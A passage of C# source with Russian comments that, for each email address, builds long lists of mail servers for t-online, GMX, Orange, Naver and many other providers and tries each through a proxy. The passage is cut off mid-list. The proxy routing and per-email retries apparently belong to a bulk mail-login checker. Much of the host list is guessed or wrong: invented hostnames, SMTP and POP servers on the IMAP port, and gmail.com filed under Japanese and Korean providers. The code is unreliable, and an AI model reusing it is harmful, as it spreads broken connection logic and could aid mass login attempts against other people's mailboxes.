            if (domain.EndsWith("t-online.de") || domain.EndsWith("t-online.com") || domain.EndsWith("t-online.at"))
            {
                Console.WriteLine($"[DEBUG] Обнаружен t-online домен: {domain} для {email}");
                
                var tOnlineAttempts = new List<(string server, int port, bool ssl, string? proxy)>
                {
                    ("secureimap.t-online.de", 993, true, proxy),
                    ("imap.t-online.de", 993, true, proxy),
                    ("mail.t-online.de", 993, true, proxy),
                    ("smtp.t-online.de", 993, true, proxy),
                    ("pop.t-online.de", 993, true, proxy),
                    ("imap.gmx.net", 993, true, proxy), // Альтернатива через GMX
                    ("imap.web.de", 993, true, proxy),  // Альтернатива через Web.de
                    ("secureimap.t-online.de", 143, true, proxy), // Порт 143 с SSL
                    ("imap.t-online.de", 143, true, proxy),
                    ("mail.t-online.de", 587, true, proxy) // SMTP порт как альтернатива
                };
                
                // Добавляем к существующим попыткам
                serverAttempts.AddRange(tOnlineAttempts);
                
                Console.WriteLine($"[DEBUG] Попытки подключения для {email}: {string.Join(", ", serverAttempts.Select(a => $"{a.server}:{a.port}"))}");
                
                // Пробуем с максимальным таймаутом для t-online
                var maxTimeout = TimeSpan.FromSeconds(30);
                
                // Дополнительные попытки для t-online с различными настройками
                var extendedAttempts = new List<(string server, int port, bool ssl, string? proxy)>(serverAttempts);
                
                // Добавляем альтернативные серверы для t-online
                if (domain == "t-online.de" || domain == "t-online.com" || domain == "t-online.at")
                {
                    extendedAttempts.AddRange(new[]
                    {
                        ("smtp.t-online.de", 587, true, proxy),
                        ("smtp.t-online.de", 465, true, proxy),
                        ("pop.t-online.de", 995, true, proxy),
                        ("pop.t-online.de", 110, false, proxy),
                        ("imap.gmx.net", 993, true, proxy),
                        ("imap.web.de", 993, true, proxy),
                        ("mail.de", 993, true, proxy),
                        ("freenet.de", 993, true, proxy),
                        ("gmx.de", 993, true, proxy),
                        ("web.de", 993, true, proxy),
                        // Дополнительные альтернативы
                        ("email.de", 993, true, proxy),
                        ("online.de", 993, true, proxy),
                        ("e-mail.de", 993, true, proxy),
                        ("email-server.de", 993, true, proxy),
                        ("smtp-server.de", 587, true, proxy),
                        ("mail-server.de", 993, true, proxy),
                        ("imap-server.de", 993, true, proxy),
                        ("secure-mail.de", 993, true, proxy),
                        ("email-server.com", 993, true, proxy)
                    });
                }
                
                // Добавляем специальные серверы для других популярных немецких провайдеров
                if (domain == "gmx.de" || domain == "gmx.net" || domain == "gmx.com" || domain == "gmx.at" || domain == "gmx.ch")
                {
                    extendedAttempts.AddRange(new[]
                    {
                        ("imap.gmx.de", 993, true, proxy),
                        ("imap.gmx.net", 993, true, proxy),
                        ("imap.gmx.at", 993, true, proxy),
                        ("imap.gmx.ch", 993, true, proxy),
                        ("mail.gmx.de", 993, true, proxy),
                        ("mail.gmx.net", 993, true, proxy),
                        ("smtp.gmx.de", 587, true, proxy),
                        ("smtp.gmx.net", 587, true, proxy),
                        ("pop.gmx.de", 995, true, proxy),
                        ("pop.gmx.net", 995, true, proxy)
                    });
                }
                
                if (domain == "web.de" || domain == "web.com")
                {
                    extendedAttempts.AddRange(new[]
                    {
                        ("imap.web.de", 993, true, proxy),
                        ("imap.web.com", 993, true, proxy),
                        ("mail.web.de", 993, true, proxy),
                        ("mail.web.com", 993, true, proxy),
                        ("smtp.web.de", 587, true, proxy),
                        ("smtp.web.com", 587, true, proxy),
                        ("pop.web.de", 995, true, proxy),
                        ("pop.web.com", 995, true, proxy)
                    });
                }
                
                if (domain == "freenet.de" || domain == "freenet.com")
                {
                    extendedAttempts.AddRange(new[]
                    {
                        ("mx.freenet.de", 993, true, proxy),
                        ("mx.freenet.com", 993, true, proxy),
                        ("imap.freenet.de", 993, true, proxy),
                        ("imap.freenet.com", 993, true, proxy),
                        ("mail.freenet.de", 993, true, proxy),
                        ("mail.freenet.com", 993, true, proxy),
                        ("smtp.freenet.de", 587, true, proxy),
                        ("smtp.freenet.com", 587, true, proxy)
                    });
                }
                
                // Специальная обработка для arcor.de
                if (domain == "arcor.de")
                {
                    extendedAttempts.AddRange(new[]
                    {
                        ("imap.arcor.de", 993, true, proxy),
                        ("mail.arcor.de", 993, true, proxy),
                        ("smtp.arcor.de", 587, true, proxy),
                        ("pop.arcor.de", 995, true, proxy),
                        ("mx.arcor.de", 993, true, proxy),
                        ("imap.mail.arcor.de", 993, true, proxy),
                        ("mail.mail.arcor.de", 993, true, proxy),
                        ("smtp.mail.arcor.de", 587, true, proxy),
                        ("secure.arcor.de", 993, true, proxy),
                        ("secureimap.arcor.de", 993, true, proxy),
                        ("imap.1und1.de", 993, true, proxy),
                        ("mail.1und1.de", 993, true, proxy),
                        ("smtp.1und1.de", 587, true, proxy),
                        ("imap.gmx.de", 993, true, proxy),
                        ("mail.gmx.de", 993, true, proxy),
                        ("imap.web.de", 993, true, proxy),
                        ("mail.web.de", 993, true, proxy)
                    });
                }
                
                // Специальная обработка для mail.de
                if (domain == "mail.de")
                {
                    extendedAttempts.AddRange(new[]
                    {
                        ("imap.mail.de", 993, true, proxy),
                        ("mail.mail.de", 993, true, proxy),
                        ("smtp.mail.de", 587, true, proxy),
                        ("pop.mail.de", 995, true, proxy),
                        ("mx.mail.de", 993, true, proxy),
                        ("secure.mail.de", 993, true, proxy),
                        ("secureimap.mail.de", 993, true, proxy),
                        ("imap-server.mail.de", 993, true, proxy),
                        ("mail-server.mail.de", 993, true, proxy),
                        ("smtp-server.mail.de", 587, true, proxy)
                    });
                }
                
                // Специальная обработка для 1und1.de
                if (domain == "1und1.de" || domain == "1and1.de")
                {
                    extendedAttempts.AddRange(new[]
                    {
                        ("imap.1und1.de", 993, true, proxy),
                        ("mail.1und1.de", 993, true, proxy),
                        ("smtp.1und1.de", 587, true, proxy),
                        ("pop.1und1.de", 995, true, proxy),
                        ("mx.1und1.de", 993, true, proxy),
                        ("secure.1und1.de", 993, true, proxy),
                        ("secureimap.1und1.de", 993, true, proxy),
                        ("imap.1and1.de", 993, true, proxy),
                        ("mail.1and1.de", 993, true, proxy),
                        ("smtp.1and1.de", 587, true, proxy)
                    });
                }
                
                // Специальная обработка для alice.de
                if (domain == "alice.de" || domain == "alice.com")
                {
                    extendedAttempts.AddRange(new[]
                    {
                        ("imap.alice.de", 993, true, proxy),
                        ("mail.alice.de", 993, true, proxy),
                        ("smtp.alice.de", 587, true, proxy),
                        ("pop.alice.de", 995, true, proxy),
                        ("mx.alice.de", 993, true, proxy),
                        ("secure.alice.de", 993, true, proxy),
                        ("secureimap.alice.de", 993, true, proxy),
                        ("imap.alice.com", 993, true, proxy),
                        ("mail.alice.com", 993, true, proxy),
                        ("smtp.alice.com", 587, true, proxy)
                    });
                }
                
                // Специальная обработка для gmx.at и web.at
                if (domain == "gmx.at" || domain == "web.at")
                {
                    extendedAttempts.AddRange(new[]
                    {
                        ("imap.gmx.at", 993, true, proxy),
                        ("mail.gmx.at", 993, true, proxy),
                        ("smtp.gmx.at", 587, true, proxy),
                        ("pop.gmx.at", 995, true, proxy),
                        ("mx.gmx.at", 993, true, proxy),
                        ("secure.gmx.at", 993, true, proxy),
                        ("secureimap.gmx.at", 993, true, proxy),
                        ("imap.web.at", 993, true, proxy),
                        ("mail.web.at", 993, true, proxy),
                        ("smtp.web.at", 587, true, proxy),
                        ("pop.web.at", 995, true, proxy)
                    });
                }
                
                // Специальная обработка для online.de и msn.de
                if (domain == "online.de" || domain == "msn.de" || domain == "msn.com")
                {
                    extendedAttempts.AddRange(new[]
                    {
                        ("imap.online.de", 993, true, proxy),
                        ("mail.online.de", 993, true, proxy),
                        ("smtp.online.de", 587, true, proxy),
                        ("pop.online.de", 995, true, proxy),
                        ("mx.online.de", 993, true, proxy),
                        ("secure.online.de", 993, true, proxy),
                        ("secureimap.online.de", 993, true, proxy),
                        ("imap.msn.de", 993, true, proxy),
                        ("mail.msn.de", 993, true, proxy),
                        ("smtp.msn.de", 587, true, proxy),
                        ("pop.msn.de", 995, true, proxy),
                        ("mx.msn.de", 993, true, proxy),
                        ("secure.msn.de", 993, true, proxy),
                        ("secureimap.msn.de", 993, true, proxy),
                        ("imap.msn.com", 993, true, proxy),
                        ("mail.msn.com", 993, true, proxy),
                        ("smtp.msn.com", 587, true, proxy)
                    });
                }
                
                // Специальная обработка для aol.de и aol.com
                if (domain == "aol.de" || domain == "aol.com")
                {
                    extendedAttempts.AddRange(new[]
                    {
                        ("imap.aol.de", 993, true, proxy),
                        ("mail.aol.de", 993, true, proxy),
                        ("smtp.aol.de", 587, true, proxy),
                        ("pop.aol.de", 995, true, proxy),
                        ("mx.aol.de", 993, true, proxy),
                        ("secure.aol.de", 993, true, proxy),
                        ("secureimap.aol.de", 993, true, proxy),
                        ("imap.aol.com", 993, true, proxy),
                        ("mail.aol.com", 993, true, proxy),
                        ("smtp.aol.com", 587, true, proxy),
                        ("pop.aol.com", 995, true, proxy),
                        ("mx.aol.com", 993, true, proxy),
                        ("secure.aol.com", 993, true, proxy),
                        ("secureimap.aol.com", 993, true, proxy),
                        ("imap.aim.com", 993, true, proxy),
                        ("mail.aim.com", 993, true, proxy)
                    });
                }
                
                // Специальная обработка для швейцарских провайдеров
                if (domain == "bluewin.ch" || domain == "swissonline.ch" || domain == "sunrise.ch")
                {
                    extendedAttempts.AddRange(new[]
                    {
                        ("imap.bluewin.ch", 993, true, proxy),
                        ("mail.bluewin.ch", 993, true, proxy),
                        ("smtp.bluewin.ch", 587, true, proxy),
                        ("pop.bluewin.ch", 995, true, proxy),
                        ("mx.bluewin.ch", 993, true, proxy),
                        ("secure.bluewin.ch", 993, true, proxy),
                        ("secureimap.bluewin.ch", 993, true, proxy),
                        ("imap.swissonline.ch", 993, true, proxy),
                        ("mail.swissonline.ch", 993, true, proxy),
                        ("smtp.swissonline.ch", 587, true, proxy),
                        ("pop.swissonline.ch", 995, true, proxy),
                        ("mx.swissonline.ch", 993, true, proxy),
                        ("secure.swissonline.ch", 993, true, proxy),
                        ("secureimap.swissonline.ch", 993, true, proxy),
                        ("imap.sunrise.ch", 993, true, proxy),
                        ("mail.sunrise.ch", 993, true, proxy),
                        ("smtp.sunrise.ch", 587, true, proxy)
                    });
                }
                
                // Специальная обработка для кабельных провайдеров
                if (domain == "kabelbw.de" || domain == "unitymedia.de" || domain == "vodafone.de")
                {
                    extendedAttempts.AddRange(new[]
                    {
                        ("imap.kabelbw.de", 993, true, proxy),
                        ("mail.kabelbw.de", 993, true, proxy),
                        ("smtp.kabelbw.de", 587, true, proxy),
                        ("pop.kabelbw.de", 995, true, proxy),
                        ("mx.kabelbw.de", 993, true, proxy),
                        ("secure.kabelbw.de", 993, true, proxy),
                        ("secureimap.kabelbw.de", 993, true, proxy),
                        ("imap.unitymedia.de", 993, true, proxy),
                        ("mail.unitymedia.de", 993, true, proxy),
                        ("smtp.unitymedia.de", 587, true, proxy),
                        ("pop.unitymedia.de", 995, true, proxy),
                        ("mx.unitymedia.de", 993, true, proxy),
                        ("secure.unitymedia.de", 993, true, proxy),
                        ("secureimap.unitymedia.de", 993, true, proxy),
                        ("imap.vodafone.de", 993, true, proxy),
                        ("mail.vodafone.de", 993, true, proxy),
                        ("smtp.vodafone.de", 587, true, proxy),
                        ("pop.vodafone.de", 995, true, proxy)
                    });
                }
                
                // Специальная обработка для французских провайдеров
                if (domain == "orange.fr" || domain == "sfr.fr" || domain == "free.fr" || domain == "wanadoo.fr")
                {
                    extendedAttempts.AddRange(new[]
                    {
                        ("imap.orange.fr", 993, true, proxy),
                        ("mail.orange.fr", 993, true, proxy),
                        ("smtp.orange.fr", 587, true, proxy),
                        ("pop.orange.fr", 995, true, proxy),
                        ("mx.orange.fr", 993, true, proxy),
                        ("secure.orange.fr", 993, true, proxy),
                        ("secureimap.orange.fr", 993, true, proxy),
                        ("imap.sfr.fr", 993, true, proxy),
                        ("mail.sfr.fr", 993, true, proxy),
                        ("smtp.sfr.fr", 587, true, proxy),
                        ("pop.sfr.fr", 995, true, proxy),
                        ("mx.sfr.fr", 993, true, proxy),
                        ("secure.sfr.fr", 993, true, proxy),
                        ("secureimap.sfr.fr", 993, true, proxy),
                        ("imap.free.fr", 993, true, proxy),
                        ("mail.free.fr", 993, true, proxy),
                        ("smtp.free.fr", 587, true, proxy),
                        ("pop.free.fr", 995, true, proxy),
                        ("mx.free.fr", 993, true, proxy),
                        ("secure.free.fr", 993, true, proxy),
                        ("secureimap.free.fr", 993, true, proxy),
                        ("imap.wanadoo.fr", 993, true, proxy),
                        ("mail.wanadoo.fr", 993, true, proxy),
                        ("smtp.wanadoo.fr", 587, true, proxy),
                        ("pop.wanadoo.fr", 995, true, proxy)
                    });
                }
                
                // Специальная обработка для итальянских провайдеров
                if (domain == "virgilio.it" || domain == "alice.it" || domain == "tin.it" || domain == "libero.it")
                {
                    extendedAttempts.AddRange(new[]
                    {
                        ("imap.virgilio.it", 993, true, proxy),
                        ("mail.virgilio.it", 993, true, proxy),
                        ("smtp.virgilio.it", 587, true, proxy),
                        ("pop.virgilio.it", 995, true, proxy),
                        ("mx.virgilio.it", 993, true, proxy),
                        ("secure.virgilio.it", 993, true, proxy),
                        ("secureimap.virgilio.it", 993, true, proxy),
                        ("imap.alice.it", 993, true, proxy),
                        ("mail.alice.it", 993, true, proxy),
                        ("smtp.alice.it", 587, true, proxy),
                        ("pop.alice.it", 995, true, proxy),
                        ("mx.alice.it", 993, true, proxy),
                        ("secure.alice.it", 993, true, proxy),
                        ("secureimap.alice.it", 993, true, proxy),
                        ("imap.tin.it", 993, true, proxy),
                        ("mail.tin.it", 993, true, proxy),
                        ("smtp.tin.it", 587, true, proxy),
                        ("pop.tin.it", 995, true, proxy),
                        ("mx.tin.it", 993, true, proxy),
                        ("secure.tin.it", 993, true, proxy),
                        ("secureimap.tin.it", 993, true, proxy),
                        ("imap.libero.it", 993, true, proxy),
                        ("mail.libero.it", 993, true, proxy),
                        ("smtp.libero.it", 587, true, proxy),
                        ("pop.libero.it", 995, true, proxy)
                    });
                }
                
                // Специальная обработка для польских провайдеров
                if (domain == "interia.pl" || domain == "wp.pl" || domain == "o2.pl" || domain == "onet.pl")
                {
                    extendedAttempts.AddRange(new[]
                    {
                        ("imap.interia.pl", 993, true, proxy),
                        ("mail.interia.pl", 993, true, proxy),
                        ("smtp.interia.pl", 587, true, proxy),
                        ("pop.interia.pl", 995, true, proxy),
                        ("mx.interia.pl", 993, true, proxy),
                        ("secure.interia.pl", 993, true, proxy),
                        ("secureimap.interia.pl", 993, true, proxy),
                        ("imap.wp.pl", 993, true, proxy),
                        ("mail.wp.pl", 993, true, proxy),
                        ("smtp.wp.pl", 587, true, proxy),
                        ("pop.wp.pl", 995, true, proxy),
                        ("mx.wp.pl", 993, true, proxy),
                        ("secure.wp.pl", 993, true, proxy),
                        ("secureimap.wp.pl", 993, true, proxy),
                        ("imap.o2.pl", 993, true, proxy),
                        ("mail.o2.pl", 993, true, proxy),
                        ("smtp.o2.pl", 587, true, proxy),
                        ("pop.o2.pl", 995, true, proxy),
                        ("mx.o2.pl", 993, true, proxy),
                        ("secure.o2.pl", 993, true, proxy),
                        ("secureimap.o2.pl", 993, true, proxy),
                        ("imap.onet.pl", 993, true, proxy),
                        ("mail.onet.pl", 993, true, proxy),
                        ("smtp.onet.pl", 587, true, proxy),
                        ("pop.onet.pl", 995, true, proxy)
                    });
                }
                
                // Специальная обработка для чешских провайдеров
                if (domain == "seznam.cz" || domain == "centrum.cz" || domain == "email.cz")
                {
                    extendedAttempts.AddRange(new[]
                    {
                        ("imap.seznam.cz", 993, true, proxy),
                        ("mail.seznam.cz", 993, true, proxy),
                        ("smtp.seznam.cz", 587, true, proxy),
                        ("pop.seznam.cz", 995, true, proxy),
                        ("mx.seznam.cz", 993, true, proxy),
                        ("secure.seznam.cz", 993, true, proxy),
                        ("secureimap.seznam.cz", 993, true, proxy),
                        ("imap.centrum.cz", 993, true, proxy),
                        ("mail.centrum.cz", 993, true, proxy),
                        ("smtp.centrum.cz", 587, true, proxy),
                        ("pop.centrum.cz", 995, true, proxy),
                        ("mx.centrum.cz", 993, true, proxy),
                        ("secure.centrum.cz", 993, true, proxy),
                        ("secureimap.centrum.cz", 993, true, proxy),
                        ("imap.email.cz", 993, true, proxy),
                        ("mail.email.cz", 993, true, proxy),
                        ("smtp.email.cz", 587, true, proxy),
                        ("pop.email.cz", 995, true, proxy)
                    });
                }
                
                // Специальная обработка для австрийских провайдеров
                if (domain == "aon.at" || domain == "chello.at" || domain == "inode.at")
                {
                    extendedAttempts.AddRange(new[]
                    {
                        ("imap.aon.at", 993, true, proxy),
                        ("mail.aon.at", 993, true, proxy),
                        ("smtp.aon.at", 587, true, proxy),
                        ("pop.aon.at", 995, true, proxy),
                        ("mx.aon.at", 993, true, proxy),
                        ("secure.aon.at", 993, true, proxy),
                        ("secureimap.aon.at", 993, true, proxy),
                        ("imap.chello.at", 993, true, proxy),
                        ("mail.chello.at", 993, true, proxy),
                        ("smtp.chello.at", 587, true, proxy),
                        ("pop.chello.at", 995, true, proxy),
                        ("mx.chello.at", 993, true, proxy),
                        ("secure.chello.at", 993, true, proxy),
                        ("secureimap.chello.at", 993, true, proxy),
                        ("imap.inode.at", 993, true, proxy),
                        ("mail.inode.at", 993, true, proxy),
                        ("smtp.inode.at", 587, true, proxy),
                        ("pop.inode.at", 995, true, proxy)
                    });
                }
                
                // Специальная обработка для бельгийских и голландских провайдеров
                if (domain == "skynet.be" || domain == "telenet.be" || domain == "planet.nl" || domain == "zonnet.nl")
                {
                    extendedAttempts.AddRange(new[]
                    {
                        ("imap.skynet.be", 993, true, proxy),
                        ("mail.skynet.be", 993, true, proxy),
                        ("smtp.skynet.be", 587, true, proxy),
                        ("pop.skynet.be", 995, true, proxy),
                        ("mx.skynet.be", 993, true, proxy),
                        ("secure.skynet.be", 993, true, proxy),
                        ("secureimap.skynet.be", 993, true, proxy),
                        ("imap.telenet.be", 993, true, proxy),
                        ("mail.telenet.be", 993, true, proxy),
                        ("smtp.telenet.be", 587, true, proxy),
                        ("pop.telenet.be", 995, true, proxy),
                        ("mx.telenet.be", 993, true, proxy),
                        ("secure.telenet.be", 993, true, proxy),
                        ("secureimap.telenet.be", 993, true, proxy),
                        ("imap.planet.nl", 993, true, proxy),
                        ("mail.planet.nl", 993, true, proxy),
                        ("smtp.planet.nl", 587, true, proxy),
                        ("pop.planet.nl", 995, true, proxy),
                        ("mx.planet.nl", 993, true, proxy),
                        ("secure.planet.nl", 993, true, proxy),
                        ("secureimap.planet.nl", 993, true, proxy),
                        ("imap.zonnet.nl", 993, true, proxy),
                        ("mail.zonnet.nl", 993, true, proxy),
                        ("smtp.zonnet.nl", 587, true, proxy),
                        ("pop.zonnet.nl", 995, true, proxy)
                    });
                }
                
                // Специальная обработка для испанских и португальских провайдеров
                if (domain == "telefonica.es" || domain == "terra.es" || domain == "sapo.pt" || domain == "clix.pt")
                {
                    extendedAttempts.AddRange(new[]
                    {
                        ("imap.telefonica.es", 993, true, proxy),
                        ("mail.telefonica.es", 993, true, proxy),
                        ("smtp.telefonica.es", 587, true, proxy),
                        ("pop.telefonica.es", 995, true, proxy),
                        ("mx.telefonica.es", 993, true, proxy),
                        ("secure.telefonica.es", 993, true, proxy),
                        ("secureimap.telefonica.es", 993, true, proxy),
                        ("imap.terra.es", 993, true, proxy),
                        ("mail.terra.es", 993, true, proxy),
                        ("smtp.terra.es", 587, true, proxy),
                        ("pop.terra.es", 995, true, proxy),
                        ("mx.terra.es", 993, true, proxy),
                        ("secure.terra.es", 993, true, proxy),
                        ("secureimap.terra.es", 993, true, proxy),
                        ("imap.sapo.pt", 993, true, proxy),
                        ("mail.sapo.pt", 993, true, proxy),
                        ("smtp.sapo.pt", 587, true, proxy),
                        ("pop.sapo.pt", 995, true, proxy),
                        ("mx.sapo.pt", 993, true, proxy),
                        ("secure.sapo.pt", 993, true, proxy),
                        ("secureimap.sapo.pt", 993, true, proxy),
                        ("imap.clix.pt", 993, true, proxy),
                        ("mail.clix.pt", 993, true, proxy),
                        ("smtp.clix.pt", 587, true, proxy),
                        ("pop.clix.pt", 995, true, proxy)
                    });
                }
                
                // Специальная обработка для скандинавских провайдеров
                if (domain == "telia.com" || domain == "telenor.se" || domain == "swipnet.se" || domain == "online.no")
                {
                    extendedAttempts.AddRange(new[]
                    {
                        ("imap.telia.com", 993, true, proxy),
                        ("mail.telia.com", 993, true, proxy),
                        ("smtp.telia.com", 587, true, proxy),
                        ("pop.telia.com", 995, true, proxy),
                        ("mx.telia.com", 993, true, proxy),
                        ("secure.telia.com", 993, true, proxy),
                        ("secureimap.telia.com", 993, true, proxy),
                        ("imap.telenor.se", 993, true, proxy),
                        ("mail.telenor.se", 993, true, proxy),
                        ("smtp.telenor.se", 587, true, proxy),
                        ("pop.telenor.se", 995, true, proxy),
                        ("mx.telenor.se", 993, true, proxy),
                        ("secure.telenor.se", 993, true, proxy),
                        ("secureimap.telenor.se", 993, true, proxy),
                        ("imap.swipnet.se", 993, true, proxy),
                        ("mail.swipnet.se", 993, true, proxy),
                        ("smtp.swipnet.se", 587, true, proxy),
                        ("pop.swipnet.se", 995, true, proxy),
                        ("mx.swipnet.se", 993, true, proxy),
                        ("secure.swipnet.se", 993, true, proxy),
                        ("secureimap.swipnet.se", 993, true, proxy),
                        ("imap.online.no", 993, true, proxy),
                        ("mail.online.no", 993, true, proxy),
                        ("smtp.online.no", 587, true, proxy),
                        ("pop.online.no", 995, true, proxy)
                    });
                }
                
                // Специальная обработка для британских провайдеров
                if (domain == "btinternet.com" || domain == "talktalk.co.uk" || domain == "virginmedia.com" || domain == "sky.com")
                {
                    extendedAttempts.AddRange(new[]
                    {
                        ("imap.btinternet.com", 993, true, proxy),
                        ("mail.btinternet.com", 993, true, proxy),
                        ("smtp.btinternet.com", 587, true, proxy),
                        ("pop.btinternet.com", 995, true, proxy),
                        ("mx.btinternet.com", 993, true, proxy),
                        ("secure.btinternet.com", 993, true, proxy),
                        ("secureimap.btinternet.com", 993, true, proxy),
                        ("imap.talktalk.co.uk", 993, true, proxy),
                        ("mail.talktalk.co.uk", 993, true, proxy),
                        ("smtp.talktalk.co.uk", 587, true, proxy),
                        ("pop.talktalk.co.uk", 995, true, proxy),
                        ("mx.talktalk.co.uk", 993, true, proxy),
                        ("secure.talktalk.co.uk", 993, true, proxy),
                        ("secureimap.talktalk.co.uk", 993, true, proxy),
                        ("imap.virginmedia.com", 993, true, proxy),
                        ("mail.virginmedia.com", 993, true, proxy),
                        ("smtp.virginmedia.com", 587, true, proxy),
                        ("pop.virginmedia.com", 995, true, proxy),
                        ("mx.virginmedia.com", 993, true, proxy),
                        ("secure.virginmedia.com", 993, true, proxy),
                        ("secureimap.virginmedia.com", 993, true, proxy),
                        ("imap.sky.com", 993, true, proxy),
                        ("mail.sky.com", 993, true, proxy),
                        ("smtp.sky.com", 587, true, proxy),
                        ("pop.sky.com", 995, true, proxy)
                    });
                }
                
                // Специальная обработка для канадских и австралийских провайдеров
                if (domain == "rogers.com" || domain == "shaw.ca" || domain == "telus.net" || domain == "optusnet.com.au" || domain == "bigpond.com")
                {
                    extendedAttempts.AddRange(new[]
                    {
                        ("imap.rogers.com", 993, true, proxy),
                        ("mail.rogers.com", 993, true, proxy),
                        ("smtp.rogers.com", 587, true, proxy),
                        ("pop.rogers.com", 995, true, proxy),
                        ("mx.rogers.com", 993, true, proxy),
                        ("secure.rogers.com", 993, true, proxy),
                        ("secureimap.rogers.com", 993, true, proxy),
                        ("imap.shaw.ca", 993, true, proxy),
                        ("mail.shaw.ca", 993, true, proxy),
                        ("smtp.shaw.ca", 587, true, proxy),
                        ("pop.shaw.ca", 995, true, proxy),
                        ("mx.shaw.ca", 993, true, proxy),
                        ("secure.shaw.ca", 993, true, proxy),
                        ("secureimap.shaw.ca", 993, true, proxy),
                        ("imap.telus.net", 993, true, proxy),
                        ("mail.telus.net", 993, true, proxy),
                        ("smtp.telus.net", 587, true, proxy),
                        ("pop.telus.net", 995, true, proxy),
                        ("mx.telus.net", 993, true, proxy),
                        ("secure.telus.net", 993, true, proxy),
                        ("secureimap.telus.net", 993, true, proxy),
                        ("imap.optusnet.com.au", 993, true, proxy),
                        ("mail.optusnet.com.au", 993, true, proxy),
                        ("smtp.optusnet.com.au", 587, true, proxy),
                        ("pop.optusnet.com.au", 995, true, proxy),
                        ("mx.optusnet.com.au", 993, true, proxy),
                        ("secure.optusnet.com.au", 993, true, proxy),
                        ("secureimap.optusnet.com.au", 993, true, proxy),
                        ("imap.bigpond.com", 993, true, proxy),
                        ("mail.bigpond.com", 993, true, proxy),
                        ("smtp.bigpond.com", 587, true, proxy),
                        ("pop.bigpond.com", 995, true, proxy)
                    });
                }
                
                // Специальная обработка для японских провайдеров
                if (domain == "yahoo.co.jp" || domain == "gmail.com" || domain == "softbank.ne.jp" || domain == "ezweb.ne.jp" || domain == "docomo.ne.jp")
                {
                    extendedAttempts.AddRange(new[]
                    {
                        ("imap.yahoo.co.jp", 993, true, proxy),
                        ("mail.yahoo.co.jp", 993, true, proxy),
                        ("smtp.yahoo.co.jp", 587, true, proxy),
                        ("pop.yahoo.co.jp", 995, true, proxy),
                        ("mx.yahoo.co.jp", 993, true, proxy),
                        ("secure.yahoo.co.jp", 993, true, proxy),
                        ("secureimap.yahoo.co.jp", 993, true, proxy),
                        ("imap.gmail.com", 993, true, proxy),
                        ("mail.gmail.com", 993, true, proxy),
                        ("smtp.gmail.com", 587, true, proxy),
                        ("pop.gmail.com", 995, true, proxy),
                        ("mx.gmail.com", 993, true, proxy),
                        ("secure.gmail.com", 993, true, proxy),
                        ("secureimap.gmail.com", 993, true, proxy),
                        ("imap.softbank.ne.jp", 993, true, proxy),
                        ("mail.softbank.ne.jp", 993, true, proxy),
                        ("smtp.softbank.ne.jp", 587, true, proxy),
                        ("pop.softbank.ne.jp", 995, true, proxy),
                        ("mx.softbank.ne.jp", 993, true, proxy),
                        ("secure.softbank.ne.jp", 993, true, proxy),
                        ("secureimap.softbank.ne.jp", 993, true, proxy),
                        ("imap.ezweb.ne.jp", 993, true, proxy),
                        ("mail.ezweb.ne.jp", 993, true, proxy),
                        ("smtp.ezweb.ne.jp", 587, true, proxy),
                        ("pop.ezweb.ne.jp", 995, true, proxy),
                        ("mx.ezweb.ne.jp", 993, true, proxy),
                        ("secure.ezweb.ne.jp", 993, true, proxy),
                        ("secureimap.ezweb.ne.jp", 993, true, proxy),
                        ("imap.docomo.ne.jp", 993, true, proxy),
                        ("mail.docomo.ne.jp", 993, true, proxy),
                        ("smtp.docomo.ne.jp", 587, true, proxy),
                        ("pop.docomo.ne.jp", 995, true, proxy)
                    });
                }
                
                // Специальная обработка для корейских провайдеров
                if (domain == "naver.com" || domain == "daum.net" || domain == "hanmail.net" || domain == "nate.com" || domain == "gmail.com")
                {
                    extendedAttempts.AddRange(new[]
                    {
                        ("imap.naver.com", 993, true, proxy),
                        ("mail.naver.com", 993, true, proxy),
                        ("smtp.naver.com", 587, true, proxy),
                        ("pop.naver.com", 995, true, proxy),
                        ("mx.naver.com", 993, true, proxy),
                        ("secure.naver.com", 993, true, proxy),
                        ("secureimap.naver.com", 993, true, proxy),
                        ("imap.daum.net", 993, true, proxy),
                        ("mail.daum.net", 993, true, proxy),
                        ("smtp.daum.net", 587, true, proxy),
                        ("pop.daum.net", 995, true, proxy),
                        ("mx.daum.net", 993, true, proxy),
                        ("secure.daum.net", 993, true, proxy),
                        ("secureimap.daum.net", 993, true, proxy),
                        ("imap.hanmail.net", 993, true, proxy),
                        ("mail.hanmail.net", 993, true, proxy),
                        ("smtp.hanmail.net", 587, true, proxy),
                        ("pop.hanmail.net", 995, true, proxy),
                        ("mx.hanmail.net", 993, true, proxy),
                        ("secure.hanmail.net", 993, true, proxy),
                        ("secureimap.hanmail.net", 993, true, proxy),
                        ("imap.nate.com", 993, true, proxy),
                        ("mail.nate.com", 993, true, proxy),
                        ("smtp.nate.com", 587, true, proxy),
                        ("pop.nate.com", 995, true, proxy),
                        ("mx.nate.com", 993, true, proxy),
                        ("secure.nate.com", 993, true, proxy),
                        ("secureimap.nate.com", 993, true, proxy)
                    });
                }
                
                // Специальная обработка для индийских провайдеров
                if (domain == "rediffmail.com" || domain == "indiatimes.com" || domain == "sify.com" || domain == "vsnl.com" || domain == "bol.net.in")
                {
                    extendedAttempts.AddRange(new[]
                    {
                        ("imap.rediffmail.com", 993, true, proxy),
                        ("mail.rediffmail.com", 993, true, proxy),
                        ("smtp.rediffmail.com", 587, true, proxy),
                        ("pop.rediffmail.com", 995, true, proxy),
                        ("mx.rediffmail.com", 993, true, proxy),
                        ("secure.rediffmail.com", 993, true, proxy),
                        ("secureimap.rediffmail.com", 993, true, proxy),
                        ("imap.indiatimes.com", 993, true, proxy),
                        ("mail.indiatimes.com", 993, true, proxy),
                        ("smtp.indiatimes.com", 587, true, proxy),
                        ("pop.indiatimes.com", 995, true, proxy),
                        ("mx.indiatimes.com", 993, true, proxy),
                        ("secure.indiatimes.com", 993, true, proxy),
                        ("secureimap.indiatimes.com", 993, true, proxy),
                        ("imap.sify.com", 993, true, proxy),
                        ("mail.sify.com", 993, true, proxy),
                        ("smtp.sify.com", 587, true, proxy),
                        ("pop.sify.com", 995, true, proxy),
                        ("mx.sify.com", 993, true, proxy),
                        ("secure.sify.com", 993, true, proxy),
                        ("secureimap.sify.com", 993, true, proxy),
                        ("imap.vsnl.com", 993, true, proxy),
                        ("mail.vsnl.com", 993, true, proxy),
                        ("smtp.vsnl.com", 587, true, proxy),
                        ("pop.vsnl.com", 995, true, proxy),
                        ("mx.vsnl.com", 993, true, proxy),
                        ("secure.vsnl.com", 993, true, proxy),
                        ("secureimap.vsnl.com", 993, true, proxy),
                        ("imap.bol.net.in", 993, true, proxy),
